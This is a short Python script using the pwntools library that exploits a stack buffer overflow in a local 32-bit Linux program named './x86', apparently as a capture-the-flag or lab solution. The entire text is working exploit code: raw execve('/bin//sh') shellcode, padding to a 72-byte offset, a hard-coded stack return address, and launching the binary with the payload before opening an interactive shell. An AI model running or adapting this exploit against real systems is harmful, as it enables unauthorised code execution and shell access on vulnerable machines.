from pwn import *

context(os='linux',arch='i386',log_level='debug')

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
padding = (72-len(shellcode)) * b'a'
ret_addr= p32(0xffffd474)

pay = padding + shellcode + ret_addr

p=process(argv=["./x86",pay])
p.interactive()